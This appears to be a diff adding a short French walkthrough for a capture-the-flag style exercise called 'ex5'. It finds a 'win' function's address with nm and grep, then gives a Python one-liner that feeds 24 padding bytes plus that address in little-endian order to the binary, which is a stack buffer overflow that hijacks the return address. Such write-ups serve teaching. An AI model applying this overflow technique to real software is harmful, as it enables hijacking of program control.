@@ -1,0 +1,11 @@
+ici il faudra utilisé la commande 'nm' avec 'grep' pour obtenir l'addresse du flag:
+
+nm ex5 | grep win
+
+une adresse sera donné et devras etre conserver
+
+ensuite il faudra utiliser du python pour avoir le flag :
+
+/!\/!\ il faut absolument remplacer le code hex par l'adresse donné et surtout à l'enver de 2 valeur/!\/!\
+
+python3 -c "import sys; sys.stdout.buffer.write(b'A'*24 + b'\xd6\x11\x40\x00\x00\x00\x00\x00')" | ./ex5
